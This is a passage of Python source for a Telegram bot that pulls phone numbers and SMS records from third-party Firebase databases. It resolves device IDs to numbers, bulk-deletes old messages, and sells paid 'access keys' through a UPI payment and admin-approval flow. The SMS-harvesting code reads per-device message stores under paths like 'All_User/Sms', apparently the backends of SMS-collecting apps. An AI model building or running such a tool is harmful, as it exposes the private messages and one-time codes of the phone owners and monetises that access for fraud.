    sm = await msg.answer(f"🔄 <i>Processing {len(pairs)} URL(s)…</i>")
    results = []; tot = 0
    for url, name in pairs:
        async with aiohttp.ClientSession() as sess:
            code, _ = await fb_ping(sess, url)
        lbl = name or url.split("//")[-1].split(".")[0]
        if code in (401, 403):
            results.append(f"🔒 <b>{lbl}</b> — Access Denied (submit 1 at a time for API key)")
            continue
        if code != 200:
            results.append(f"❌ <b>{lbl}</b> — HTTP {code}")
            continue
        n, err, stype = await sync_one(url, name)
        if err: results.append(f"⚠️ <b>{lbl}</b> — {err}")
        else:
            results.append(f"✅ <b>{lbl}</b> — {n} numbers [{stype}]")
            tot += n
            db.log_action(msg.from_user.id, "Firebase Added (bulk)", f"{lbl}: {n}")
    a = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    await sm.edit_text(
        f"🔗 <b>Bulk Sync Done!</b>\n━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(results)
        + f"\n\n🔄 Total: <b>{tot}</b>  🟢 Active: <b>{a}</b>  📱 DB: <b>{t}</b>")


@router.message(S.fb_apikey)
async def proc_fb_apikey(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    if msg.text.strip() == "/cancel":
        await state.clear(); return await msg.answer("❌ Cancelled.")
    data    = await state.get_data()
    url     = data.get("pending_fb_url")
    name    = data.get("pending_fb_name")
    api_key = msg.text.strip()
    await state.clear()
    sm = await msg.answer("🔍 <i>Testing with API key…</i>")
    async with aiohttp.ClientSession() as sess:
        code, _ = await fb_ping(sess, url, api_key=api_key)
    if code in (401, 403):
        return await sm.edit_text("🔒 <b>Invalid Key. Not saved.</b>")
    if code != 200:
        return await sm.edit_text(f"❌ Connection failed (HTTP {code}).")
    await sm.edit_text("✅ <i>Key accepted! Syncing…</i>")
    n, err, stype = await sync_one(url, name, api_key=api_key)
    db.log_action(msg.from_user.id, "Firebase Added (private)", f"{name}: {n}")
    if err: return await sm.edit_text(f"⚠️ Sync error:\n{err}")
    await sm.edit_text(
        f"╔══════════════════════╗\n"
        f"  ✅ <b>FIREBASE SAVED!</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🔢 Numbers: <b>{n}</b>\n"
        f"🏗 Structure: <b>{stype}</b>\n"
        f"🔑 Secured with API key ✓")


# ══════════════════════════════════════════════════════════════
# FIREBASE SOURCES LIST + DELETE
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_fb_list")
async def cb_fb_list(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rows = db.cx().execute("SELECT * FROM firebase_sources ORDER BY id DESC").fetchall()
    if not rows: return await call.answer("No sources added yet.", show_alert=True)
    text = "╔══════════════════════╗\n  🔗 <b>FIREBASE SOURCES</b>\n╚══════════════════════╝\n\n"
    btns = []
    for r in rows:
        key_icon  = "🔑" if r["api_key"] else "🔓"
        q_icon    = "⚠️ " if r["quarantined"] else ""
        h_icon    = _health_icon(r["health_level"] if not r["quarantined"] else "Quarantined")
        text += (f"{h_icon} <b>{r['label']}</b> {key_icon} [{r['struct_type'] or '?'}]{q_icon}\n"
                 f"   📱 {r['num_count']} numbers  |  🕐 {r['last_synced']}\n\n")
        btns.append([
            InlineKeyboardButton(text=f"🔄 {r['label'][:12]}", callback_data=f"resync_src_{r['id']}"),
            InlineKeyboardButton(text="🗑 Delete",              callback_data=f"del_src_{r['id']}")])
    await call.message.answer(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("del_src_"))
async def cb_del_src(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    sid = int(call.data.split("_")[2])
    src = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (sid,)).fetchone()
    if not src: return await call.answer("Not found.", show_alert=True)
    with db.cx() as c:
        c.execute("DELETE FROM numbers WHERE fb_source=?", (src["url"],))
        c.execute("DELETE FROM firebase_sources WHERE id=?", (sid,))
    db.log_action(call.from_user.id, "Firebase Deleted", src["label"])
    await call.answer(f"🗑 Deleted '{src['label']}'.", show_alert=True)
    try: await call.message.delete()
    except: pass


@router.callback_query(F.data.startswith("resync_src_"))
async def cb_resync_src(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    sid = int(call.data.split("_")[2])
    src = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (sid,)).fetchone()
    if not src: return await call.answer("Not found.", show_alert=True)
    sm = await call.message.answer(f"🔄 <i>Re-syncing {src['label']}…</i>")
    n, err, stype = await sync_one(src["url"])
    if err: await sm.edit_text(f"❌ {src['label']}: {err}")
    else:   await sm.edit_text(f"✅ <b>{src['label']}</b> — {n} numbers [{stype}]")
    await call.answer()


# ══════════════════════════════════════════════════════════════
# SYNC ALL
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_sync")
async def cb_sync(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    srcs = db.cx().execute("SELECT url FROM firebase_sources WHERE quarantined=0").fetchall()
    if not srcs: return await call.answer("No active sources.", show_alert=True)
    sm = await call.message.answer(f"🔄 <i>Syncing {len(srcs)} source(s)…</i>")
    tot = 0
    for s in srcs:
        n, err, _ = await sync_one(s["url"])
        tot += n
    a = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active'").fetchone()["c"]
    t = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    await sm.edit_text(f"✅ <b>Synced!</b>\n🔄 {tot} numbers  |  🟢 Active: {a}  |  📱 Total: {t}")
    await call.answer()


# ══════════════════════════════════════════════════════════════
# PURGE OLD SMS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_purge")
async def cb_adm_purge(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.answer(
        "🧹 <b>Purge Old SMS</b>\n\n"
        "Delete Firebase SMS records older than 48 hours.\n"
        "⚠️ <i>Cannot be undone.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="✅ Yes, Purge", callback_data="adm_purge_confirm"),
            InlineKeyboardButton(text="❌ Cancel",     callback_data="adm_purge_cancel")]]))
    await call.answer()


@router.callback_query(F.data == "adm_purge_cancel")
async def cb_purge_cancel(call: CallbackQuery):
    await call.message.edit_text("❌ Purge cancelled."); await call.answer()


@router.callback_query(F.data == "adm_purge_confirm")
async def cb_purge_confirm(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    sm = await call.message.edit_text("🧹 <i>Purging old SMS from Firebase…</i>")
    srcs       = db.cx().execute("SELECT url, api_key FROM firebase_sources").fetchall()
    cutoff_ms  = int((datetime.now() - timedelta(hours=48)).timestamp() * 1000)
    total_del  = 0
    async with aiohttp.ClientSession() as sess:
        for src in srcs:
            base    = src["url"]; api_key = src["api_key"]
            sh_data = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            if not isinstance(sh_data, dict): continue
            rk      = list(sh_data.keys())[0] if sh_data else None
            paths   = [f"{base}/sms", f"{base}/user_sms", f"{base}/messages"]
            if rk: paths.insert(0, f"{base}/{rk}/All_User/Sms")
            for sms_root in paths:
                devs = await fb_get(sess, f"{sms_root}.json?shallow=true", api_key=api_key)
                if not isinstance(devs, dict): continue
                for dev_id in list(devs.keys())[:50]:
                    node = await fb_get(sess, f"{sms_root}/{dev_id}.json", api_key=api_key)
                    if not isinstance(node, dict): continue
                    for k, v in node.items():
                        if not isinstance(v, dict): continue
                        ts = None
                        for tf in ("timestamp","backupTime","date"):
                            raw = v.get(tf)
                            if raw and str(raw).isdigit():
                                ts = int(str(raw))
                                if len(str(raw)) > 10: ts = ts // 1000
                                break
                        if ts and ts < (cutoff_ms // 1000):
                            if await fb_delete(sess, f"{sms_root}/{dev_id}/{k}.json", api_key=api_key):
                                total_del += 1
    with db.cx() as c:
        c.execute("DELETE FROM sms_log WHERE received_at < ?",
                  ((_now_ist() - timedelta(hours=48)).strftime("%d-%m-%Y %H:%M:%S"),))
        c.execute("DELETE FROM sms_dedup WHERE seen_at < ?",
                  ((_now_ist() - timedelta(hours=48)).strftime("%d-%m-%Y %H:%M:%S"),))
    db.log_action(call.from_user.id, "SMS Purged", f"{total_del} records")
    await sm.edit_text(
        f"╔══════════════════════╗\n"
        f"  🧹 <b>PURGE COMPLETE</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🗑 Firebase records deleted: <b>{total_del}</b>")
    await call.answer()


# ══════════════════════════════════════════════════════════════
# RESCAN GHOSTS
# ══════════════════════════════════════════════════════════════

async def _do_rescan(answer_fn):
    devs = db.cx().execute(
        "SELECT * FROM numbers WHERE is_ghost=1 OR number LIKE 'DEV-%'").fetchall()
    if not devs:
        return await answer_fn("✅ No ghost devices! All numbers are resolved.")
    sm = await answer_fn(
        f"╔══════════════════════╗\n"
        f"  🔍 <b>RESCAN STARTED</b>\n"
        f"╚══════════════════════╝\n\n"
        f"👻 Found <b>{len(devs)}</b> ghost(s)\n"
        f"<i>Progress updates every 5 devices…</i>")
    found_list = []; fail_list = []
    for idx, n in enumerate(devs, 1):
        if idx % 5 == 0:
            try:
                await sm.edit_text(
                    f"🔍 <b>RESCANNING…</b>  {idx}/{len(devs)}\n"
                    f"✅ Found: <b>{len(found_list)}</b>  ❌ Missing: <b>{len(fail_list)}</b>")
            except: pass
        api_key = _get_fb_apikey(n["fb_source"])
        ph, ca  = await _auto_probe_number(n["device_id"], n["fb_source"], api_key)
        if ph and ph != n["number"]:
            with db.cx() as cx:
                cx.execute("UPDATE numbers SET number=?,carrier=?,is_ghost=0 WHERE id=?",
                           (ph, ca or n["carrier"], n["id"]))
            found_list.append(f"✅ <code>{(n['device_id'] or '')[:10]}…</code> → <code>{ph}</code>")
        else:
            fail_list.append(f"❌ <code>{(n['device_id'] or '')[:10]}…</code> — still unknown")
    lines = (found_list + fail_list)[:30]
    await sm.edit_text(
        f"╔══════════════════════╗\n"
        f"  🔍 <b>RESCAN COMPLETE</b>\n"
        f"╚══════════════════════╝\n\n"
        f"✅ Resolved: <b>{len(found_list)}</b> / {len(devs)}\n"
        f"❌ Still ghost: <b>{len(fail_list)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines))


@router.callback_query(F.data == "adm_rescan")
async def cb_adm_rescan(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.answer(); await _do_rescan(call.message.answer)


@router.message(Command("rescan"))
async def cmd_rescan(msg: Message):
    if msg.from_user.id not in ADMIN_IDS: return await msg.answer("⛔ Admin only.")
    await _do_rescan(msg.answer)


# ══════════════════════════════════════════════════════════════
# PAID KEY SYSTEM — helper
# ══════════════════════════════════════════════════════════════

def _gen_txn_id():
    part = secrets.token_hex(4).upper()
    ts   = str(int(_now_ist().timestamp()))[-6:]
    return f"PAY-{part}-{ts}"


def _paid_dur_label(mins_str):
    _DUR_LABELS = {"1":"1 min","120":"2h","1440":"24h","10080":"7d","43200":"30d","86400":"60d"}
    return _DUR_LABELS.get(str(mins_str), f"{mins_str}m")


# ══════════════════════════════════════════════════════════════
# PAID KEY — USER FLOW
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "buy_key")
async def cb_buy_key(call: CallbackQuery, state: FSMContext):
    await call.answer()
    if db.get("paid_key_enabled") != "1":
        return await call.message.answer("💳 <b>Paid keys are not enabled yet.</b>\n<i>Contact admin.</i>")
    upi    = db.get("paid_key_upi") or ""
    amount = db.get("paid_key_amount") or "99"
    qr_fid = db.get("paid_key_qr_file_id") or ""
    pkt    = db.get("paid_key_type") or "perm"
    pkd    = db.get("paid_key_duration") or "1440"
    dur_lbl = _paid_dur_label(pkd) if pkt == "temp" else "Permanent ♾"
    txn_id  = _gen_txn_id()
    await state.update_data(pending_txn_id=txn_id)
    text = (
        f"╔══════════════════════╗\n"
        f"  💳 <b>BUY ACCESS KEY</b>\n"
        f"╚══════════════════════╝\n\n"
        f"💰 <b>Amount:</b> ₹{amount}\n"
        f"🆔 <b>UPI ID:</b> <code>{upi}</code>\n"
        f"📋 <b>Transaction ID:</b> <code>{txn_id}</code>\n"
        f"⏱ <b>Key Type:</b> {dur_lbl}\n\n"
        f"<b>Steps:</b>\n"
        f"1️⃣ Open your UPI app\n"
        f"2️⃣ Pay ₹{amount} to: <code>{upi}</code>\n"
        f"3️⃣ Save the UTR/Reference number\n"
        f"4️⃣ Tap <b>✅ I Have Paid</b> below\n\n"
        f"<i>Your key will be sent after admin verification (usually within 30 min).</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ I Have Paid", callback_data="paid_confirm")],
        [InlineKeyboardButton(text="❌ Cancel",      callback_data="back_home")],
    ])
    if qr_fid:
        try:
            await call.message.answer_photo(photo=qr_fid, caption=text, reply_markup=kb)
            return
        except Exception:
            pass
    await call.message.answer(text, reply_markup=kb)


@router.callback_query(F.data == "paid_confirm")
async def cb_paid_confirm(call: CallbackQuery, state: FSMContext):
    await call.answer()
    data = await state.get_data()
    if not data.get("pending_txn_id"):
        txn_id = _gen_txn_id()
        await state.update_data(pending_txn_id=txn_id)
    await call.message.answer(
        f"✅ <b>Payment Confirmation</b>\n\n"
        f"Please send your <b>UTR / Reference Number</b>\n"
        f"(12-digit number shown in your UPI app after payment)\n\n"
        f"<i>Example: 432156789012</i>")
    await state.set_state(S.paid_utr)


@router.message(S.paid_utr)
async def proc_paid_utr(msg: Message, state: FSMContext):
    utr = msg.text.strip() if msg.text else ""
    if not utr or len(utr) < 6:
        return await msg.answer("❌ Invalid UTR. Please send the UTR/Reference number from your UPI app.")
    await state.update_data(pending_utr=utr)
    await msg.answer(
        f"📸 <b>Upload Payment Screenshot</b>\n\n"
        f"Now send a screenshot of the successful payment from your UPI app.\n"
        f"<i>This helps admin verify quickly.</i>")
    await state.set_state(S.paid_screenshot)


@router.message(S.paid_screenshot)
async def proc_paid_screenshot(msg: Message, state: FSMContext):
    if not msg.photo:
        return await msg.answer("❌ Please send a photo (screenshot) of your payment.")
    data   = await state.get_data()
    txn_id = data.get("pending_txn_id") or _gen_txn_id()
    utr    = data.get("pending_utr", "N/A")
    fid    = msg.photo[-1].file_id
    uid    = msg.from_user.id
    uname  = msg.from_user.username or msg.from_user.first_name or "User"
    amount = db.get("paid_key_amount") or "99"
    upi    = db.get("paid_key_upi") or ""
    now    = _now_ist().strftime("%d-%m-%Y %H:%M")
    await state.clear()
    with db.cx() as c:
        c.execute(
            "INSERT OR IGNORE INTO paid_payments(user_id,username,txn_id,amount,upi_id,utr_id,screenshot_file_id,status,submitted_at) "
            "VALUES(?,?,?,?,?,?,?,?,?)",
            (uid, uname, txn_id, amount, upi, utr, fid, "pending", now))
    await msg.answer(
        f"╔══════════════════════╗\n"
        f"  ✅ <b>PAYMENT SUBMITTED!</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📋 Transaction ID: <code>{txn_id}</code>\n"
        f"🔢 UTR: <code>{utr}</code>\n"
        f"💰 Amount: ₹{amount}\n\n"
        f"⏳ <b>Admin will verify and send your key shortly.</b>\n"
        f"<i>You'll receive a message here once approved.</i>")
    # Notify admin(s)
    admin_text = (
        f"╔══════════════════════╗\n"
        f"  💳 <b>NEW PAYMENT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"👤 User: @{uname} (<code>{uid}</code>)\n"
        f"💰 Amount: ₹{amount}\n"
        f"🆔 TXN: <code>{txn_id}</code>\n"
        f"🔢 UTR: <code>{utr}</code>\n"
        f"🕐 At: {now}"
    )
    row = db.cx().execute("SELECT id FROM paid_payments WHERE txn_id=?", (txn_id,)).fetchone()
    pid = row["id"] if row else 0
    kb  = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Approve & Send Key", callback_data=f"paid_approve_{pid}"),
         InlineKeyboardButton(text="❌ Reject",             callback_data=f"paid_reject_{pid}")],
        [InlineKeyboardButton(text="🖼 View Screenshot",    callback_data=f"paid_view_{pid}")],
    ])
    for aid in ADMIN_IDS:
        try:
            await bot.send_photo(aid, photo=fid, caption=admin_text, reply_markup=kb)
        except Exception:
            try: await bot.send_message(aid, admin_text, reply_markup=kb)
            except Exception: pass


# ══════════════════════════════════════════════════════════════
# PAID KEY — ADMIN PANEL
# ══════════════════════════════════════════════════════════════

def _menu_paid_mgmt():
    upi    = db.get("paid_key_upi") or "Not set"
    amount = db.get("paid_key_amount") or "99"
    pkt    = db.get("paid_key_type") or "perm"
    pkd    = db.get("paid_key_duration") or "1440"
    enabled = db.get("paid_key_enabled") == "1"
    dur_lbl = _paid_dur_label(pkd) if pkt == "temp" else "Permanent"
    en_btn  = "🔴 Disable Paid Keys" if enabled else "🟢 Enable Paid Keys"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Pending Payments",    callback_data="paid_list_0")],
        [InlineKeyboardButton(text="💳 Set UPI ID",          callback_data="adm_paid_set_upi"),
         InlineKeyboardButton(text="💰 Set Amount",          callback_data="adm_paid_set_amount")],
        [InlineKeyboardButton(text="📷 Set QR Code",         callback_data="adm_paid_set_qr"),
         InlineKeyboardButton(text="🎫 Key Type",            callback_data="adm_paid_keytype")],
        [InlineKeyboardButton(text=en_btn,                   callback_data="adm_paid_toggle")],
        [InlineKeyboardButton(text="🔙 Admin",               callback_data="back_admin")],
    ])


@router.callback_query(F.data == "adm_paid_mgmt")
async def cb_adm_paid_mgmt(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    upi    = db.get("paid_key_upi") or "❌ Not set"
    amount = db.get("paid_key_amount") or "99"
    pkt    = db.get("paid_key_type") or "perm"
    pkd    = db.get("paid_key_duration") or "1440"
    enabled = db.get("paid_key_enabled") == "1"
    dur_lbl = _paid_dur_label(pkd) if pkt == "temp" else "Permanent ♾"
    pending = db.cx().execute("SELECT COUNT(*) as c FROM paid_payments WHERE status='pending'").fetchone()["c"]
    total   = db.cx().execute("SELECT COUNT(*) as c FROM paid_payments").fetchone()["c"]
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  💳 <b>PAID KEY MGMT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🟢 Status: <b>{'ENABLED' if enabled else '🔴 DISABLED'}</b>\n"
        f"💳 UPI: <code>{upi}</code>\n"
        f"💰 Amount: <b>₹{amount}</b>\n"
        f"🎫 Key Type: <b>{dur_lbl}</b>\n\n"
        f"📋 Pending: <b>{pending}</b>  |  Total: <b>{total}</b>",
        reply_markup=_menu_paid_mgmt())
    await call.answer()


@router.callback_query(F.data == "adm_paid_toggle")
async def cb_paid_toggle(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    nv = "0" if db.get("paid_key_enabled") == "1" else "1"
    upi = db.get("paid_key_upi") or ""
    if nv == "1" and not upi:
        return await call.answer("❌ Set UPI ID first before enabling.", show_alert=True)
    db.set("paid_key_enabled", nv)
    db.log_action(call.from_user.id, "Paid Keys", "Enabled" if nv=="1" else "Disabled")
    await call.answer(f"Paid keys: {'ENABLED ✅' if nv=='1' else 'DISABLED 🔴'}", show_alert=True)
    await cb_adm_paid_mgmt(call)


@router.callback_query(F.data == "adm_paid_set_upi")
async def cb_paid_set_upi(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    cur = db.get("paid_key_upi") or "Not set"
    await call.message.answer(
        f"💳 <b>Set UPI ID</b>\n\nCurrent: <code>{cur}</code>\n\nSend the new UPI ID:")
    await state.set_state(S.set_paid_upi); await call.answer()


@router.message(S.set_paid_upi)
async def proc_paid_upi(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    upi = msg.text.strip()
    db.set("paid_key_upi", upi)
    db.log_action(msg.from_user.id, "Paid UPI Set", upi)
    await state.clear()
    await msg.answer(f"✅ UPI ID set to: <code>{upi}</code>")


@router.callback_query(F.data == "adm_paid_set_amount")
async def cb_paid_set_amount(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    cur = db.get("paid_key_amount") or "99"
    btns = [
        [InlineKeyboardButton(text="₹49",  callback_data="paid_amt_49"),
         InlineKeyboardButton(text="₹99",  callback_data="paid_amt_99")],
        [InlineKeyboardButton(text="₹149", callback_data="paid_amt_149"),
         InlineKeyboardButton(text="₹199", callback_data="paid_amt_199")],
        [InlineKeyboardButton(text="₹299", callback_data="paid_amt_299"),
         InlineKeyboardButton(text="₹499", callback_data="paid_amt_499")],
        [InlineKeyboardButton(text="✏️ Custom amount", callback_data="paid_amt_custom")],
    ]
    await call.message.answer(
        f"💰 <b>Set Payment Amount</b>\n\nCurrent: <b>₹{cur}</b>\n\nSelect or enter custom:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("paid_amt_"))
async def cb_paid_amt(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    val = call.data.split("paid_amt_")[1]
    if val == "custom":
        await call.message.answer("✏️ Send custom amount in ₹ (numbers only, e.g. 299):")
        await state.set_state(S.set_paid_amount)
        return await call.answer()
    db.set("paid_key_amount", val)
    db.log_action(call.from_user.id, "Paid Amount Set", f"₹{val}")
    await call.answer(f"✅ Amount set to ₹{val}", show_alert=True)


@router.message(S.set_paid_amount)
async def proc_paid_amount(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    if not msg.text or not msg.text.strip().isdigit():
        return await msg.answer("❌ Send numbers only (e.g. 149)")
    db.set("paid_key_amount", msg.text.strip())
    db.log_action(msg.from_user.id, "Paid Amount Set", f"₹{msg.text.strip()}")
    await state.clear()
    await msg.answer(f"✅ Amount set to ₹{msg.text.strip()}")


@router.callback_query(F.data == "adm_paid_set_qr")
async def cb_paid_set_qr(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.answer(
        "📷 <b>Set QR Code</b>\n\n"
        "Send a photo of your UPI QR code.\n"
        "<i>Users will see this when they click Buy Key.</i>")
    await state.set_state(S.set_paid_qr); await call.answer()


@router.message(S.set_paid_qr)
async def proc_paid_qr(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    if not msg.photo:
        return await msg.answer("❌ Please send a photo of your QR code.")
    fid = msg.photo[-1].file_id
    db.set("paid_key_qr_file_id", fid)
    db.log_action(msg.from_user.id, "Paid QR Set", "Updated")
    await state.clear()
    await msg.answer("✅ QR code saved! Users will now see this when buying a key.")


@router.callback_query(F.data == "adm_paid_keytype")
async def cb_paid_keytype(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    pkt = db.get("paid_key_type") or "perm"
    pkd = db.get("paid_key_duration") or "1440"
    dur_lbl = _paid_dur_label(pkd)
    cur_desc = "♾ Permanent" if pkt == "perm" else f"⏱ Temporary ({dur_lbl})"
    btns = [
        [InlineKeyboardButton(text="♾ Permanent (never expires)", callback_data="paidkt_perm")],
        [InlineKeyboardButton(text="⏱ Temporary (select duration)", callback_data="paidkt_temp")],
    ]
    if pkt == "temp":
        _DUR_OPTS_P = [("1 min","1"),("2h","120"),("24h","1440"),("7d","10080"),("30d","43200"),("60d","86400")]
        btns += [[InlineKeyboardButton(text=f"{'✅ ' if pkd==d else ''}{lbl}", callback_data=f"paidkd_{d}")]
                 for lbl, d in _DUR_OPTS_P]
    btns.append([InlineKeyboardButton(text="🔙 Paid Mgmt", callback_data="adm_paid_mgmt")])
    await call.message.edit_text(
        f"🎫 <b>Paid Key Type</b>\n\n📌 Current: <b>{cur_desc}</b>\n\n"
        f"Choose what type of key users receive after payment:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data == "paidkt_perm")
async def cb_paidkt_perm(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    db.set("paid_key_type", "perm")
    db.log_action(call.from_user.id, "Paid Key Type", "Permanent")
    await call.answer("✅ Paid keys → Permanent", show_alert=True)
    await cb_paid_keytype(call)


@router.callback_query(F.data == "paidkt_temp")
async def cb_paidkt_temp(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    db.set("paid_key_type", "temp")
    db.log_action(call.from_user.id, "Paid Key Type", "Temporary")
    await call.answer("✅ Paid keys → Temporary. Select duration.", show_alert=True)
    await cb_paid_keytype(call)


@router.callback_query(F.data.startswith("paidkd_"))
async def cb_paidkd(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    dur = call.data.split("paidkd_")[1]
    db.set("paid_key_type", "temp")
    db.set("paid_key_duration", dur)
    db.log_action(call.from_user.id, "Paid Key Duration", _paid_dur_label(dur))
    await call.answer(f"✅ Duration: {_paid_dur_label(dur)}", show_alert=True)
    await cb_paid_keytype(call)


@router.callback_query(F.data.startswith("paid_list_"))
async def cb_paid_list(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    page = int(call.data.split("paid_list_")[1])
    rows = db.cx().execute(
        "SELECT * FROM paid_payments ORDER BY id DESC LIMIT 10 OFFSET ?", (page * 10,)).fetchall()
    total = db.cx().execute("SELECT COUNT(*) as c FROM paid_payments").fetchone()["c"]
    pend  = db.cx().execute("SELECT COUNT(*) as c FROM paid_payments WHERE status='pending'").fetchone()["c"]
    if not rows:
        return await call.message.edit_text(
            "💳 <b>PAYMENTS</b>\n\nNo payments found.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Paid Mgmt", callback_data="adm_paid_mgmt")]]))
    text = (f"╔══════════════════════╗\n"
            f"  💳 <b>PAYMENTS</b>\n"
            f"╚══════════════════════╝\n\n"
            f"📋 Total: <b>{total}</b>  |  ⏳ Pending: <b>{pend}</b>\n\n")
    btns = []
    _STATUS_ICONS = {"pending":"⏳","approved":"✅","rejected":"❌"}
    for r in rows:
        icon = _STATUS_ICONS.get(r["status"], "❓")
        text += f"{icon} <code>{r['txn_id']}</code> — @{r['username']} ₹{r['amount']} [{r['status']}]\n"
        btns.append([InlineKeyboardButton(
            text=f"{icon} #{r['id']} @{r['username']} ₹{r['amount']}",
            callback_data=f"paid_view_{r['id']}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="◀ Prev", callback_data=f"paid_list_{page-1}"))
    if (page + 1) * 10 < total:
        nav.append(InlineKeyboardButton(text="Next ▶", callback_data=f"paid_list_{page+1}"))
    if nav: btns.append(nav)
    btns.append([InlineKeyboardButton(text="🔙 Paid Mgmt", callback_data="adm_paid_mgmt")])
    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("paid_view_"))
async def cb_paid_view(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    pid = int(call.data.split("paid_view_")[1])
    r   = db.cx().execute("SELECT * FROM paid_payments WHERE id=?", (pid,)).fetchone()
    if not r: return await call.answer("Not found.", show_alert=True)
    _STATUS_ICONS = {"pending":"⏳","approved":"✅","rejected":"❌"}
    icon = _STATUS_ICONS.get(r["status"], "❓")
    text = (
        f"╔══════════════════════╗\n"
        f"  💳 <b>PAYMENT #{pid}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{icon} Status: <b>{r['status'].upper()}</b>\n"
        f"👤 User: @{r['username']} (<code>{r['user_id']}</code>)\n"
        f"💰 Amount: <b>₹{r['amount']}</b>\n"
        f"🆔 TXN: <code>{r['txn_id']}</code>\n"
        f"🔢 UTR: <code>{r['utr_id'] or 'N/A'}</code>\n"
        f"🕐 Submitted: {r['submitted_at']}\n"
        + (f"🔑 Key: <code>{r['key_issued']}</code>\n" if r["key_issued"] else "")
        + (f"📝 Note: {r['admin_note']}\n" if r["admin_note"] else "")
    )
    kb_btns = []
    if r["status"] == "pending":
        kb_btns.append([
            InlineKeyboardButton(text="✅ Approve",  callback_data=f"paid_approve_{pid}"),
            InlineKeyboardButton(text="❌ Reject",   callback_data=f"paid_reject_{pid}"),
        ])
    if r["screenshot_file_id"]:
        kb_btns.append([InlineKeyboardButton(text="🖼 Screenshot", callback_data=f"paid_scr_{pid}")])
    kb_btns.append([InlineKeyboardButton(text="🔙 List", callback_data="paid_list_0")])
    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_btns))
    await call.answer()


@router.callback_query(F.data.startswith("paid_scr_"))
async def cb_paid_screenshot_view(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    pid = int(call.data.split("paid_scr_")[1])
    r   = db.cx().execute("SELECT screenshot_file_id, txn_id FROM paid_payments WHERE id=?", (pid,)).fetchone()
    if not r or not r["screenshot_file_id"]:
        return await call.answer("No screenshot available.", show_alert=True)
    await call.message.answer_photo(r["screenshot_file_id"], caption=f"🖼 Screenshot for TXN <code>{r['txn_id']}</code>")
    await call.answer()


@router.callback_query(F.data.startswith("paid_approve_"))
async def cb_paid_approve(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    pid = int(call.data.split("paid_approve_")[1])
    r   = db.cx().execute("SELECT * FROM paid_payments WHERE id=?", (pid,)).fetchone()
    if not r: return await call.answer("Not found.", show_alert=True)
    if r["status"] != "pending":
        return await call.answer(f"Already {r['status']}.", show_alert=True)
    now = _now_ist().strftime("%d-%m-%Y %H:%M")
    pkt = db.get("paid_key_type") or "perm"
